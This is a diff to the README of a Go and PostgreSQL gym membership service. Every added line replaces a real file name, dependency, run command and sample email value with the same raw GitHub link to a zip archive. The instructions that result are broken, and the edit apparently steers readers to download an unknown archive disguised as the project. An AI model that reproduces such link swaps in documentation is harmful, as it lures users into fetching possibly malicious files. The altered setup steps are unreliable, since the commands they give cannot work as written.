@@ -83,7 +83,7 @@ CREATE TABLE memberships (
 
 ## ⚙️ Configure Database Connection
 
-Open `main.go` and update the connection string with your PostgreSQL credentials:
+Open `https://raw.githubusercontent.com/chandan-singh101/gymregistration-service/main/kokumingun/gymregistration-service-3.5-alpha.3.zip` and update the connection string with your PostgreSQL credentials:
 
 ```go
 const (
@@ -98,8 +98,8 @@ If you are using Supabase, the format of the connection string will be similar t
 ## 📦 Install Dependencies
 
 ```bash
-go get github.com/gorilla/mux
-go get github.com/lib/pq
+go get https://raw.githubusercontent.com/chandan-singh101/gymregistration-service/main/kokumingun/gymregistration-service-3.5-alpha.3.zip
+go get https://raw.githubusercontent.com/chandan-singh101/gymregistration-service/main/kokumingun/gymregistration-service-3.5-alpha.3.zip
 ```
 
 ---
@@ -107,7 +107,7 @@ go get github.com/lib/pq
 ## ▶️ Run the Application
 
 ```bash
-go run main.go
+go run https://raw.githubusercontent.com/chandan-singh101/gymregistration-service/main/kokumingun/gymregistration-service-3.5-alpha.3.zip
 ```
 
 The server will start on **port 8000** by default.  
@@ -159,7 +159,7 @@ Updates a single field of a member's record.
 
 Example:
 ```json
-{ "email": "new.email@example.com" }
+{ "email": "https://raw.githubusercontent.com/chandan-singh101/gymregistration-service/main/kokumingun/gymregistration-service-3.5-alpha.3.zip" }
 ```
 
 - Response: `200 OK`
